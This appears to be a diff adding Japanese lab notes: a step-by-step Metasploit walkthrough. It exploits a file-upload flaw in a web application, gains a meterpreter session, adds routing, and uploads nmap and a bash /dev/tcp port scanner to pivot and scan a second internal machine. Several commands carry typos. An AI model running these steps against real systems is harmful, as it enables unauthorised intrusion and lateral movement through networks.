@@ -1,0 +1,44 @@
+network service scanning
+1) pingでホストが稼働しているかを確認する
+2) nmapでセキュリティホールを確認する
+3) msfconsoleを起動する
+4) モジュールの起動、設定、実行を行う
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS
+set TARGETURI /
+set LHOST
+exploit
+5) meterpreterの権限を奪取後、以下のコマンドで2番目のマシンのIPアドレス範囲を特定する
+shell
+ip addr
+6) metasploitのルーティングテーブルを追加する
+run autoroute -s 1台目のIPアドレス
+7) 現在のmeterpreterをCtrl+zでバッググラウンドに移行する
+8) モジュールの設定、実行を行う
+search portscan
+use でモジュールを起動する
+set VERBOSE false
+set port 1-1000
+exploit
+9) 以下のコマンドで「/usr/bin/」ディレクトリで使用可能な静的バイナリを確認する
+ls -al /root/static-binarues/nmap
+file /root/static-binaries/nmap
+10) Ctrl+Zでmetasploitをバッググラウンドで実行する
+11) bashスクリプトを作成する
+nano bash-port-scanner.sh
+「#!/bin/bash
+for port in {1..1000}; do
+ timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done」
+12) fgでmetasploitとフォアグラウンドに戻す
+13) sessionsでセッションを一覧表示後、sessions -i 1でセッションを起動する
+14) nmap静的バイナリとbashポートスキャナースクリプトマシンをターゲットマシンにアップロードする
+uoload /root/static-binaries/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+14) バイナリとスクリプトを実行し、bashスクリプトを使用して、2番目のターゲットマシンをスキャンする
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh ターゲットマシン(2台目のIPアドレス）
+15) nmapバイナリを使用して、ターゲットのポートスキャンを行う
+./nmap -p- ターゲットIP（2台目）
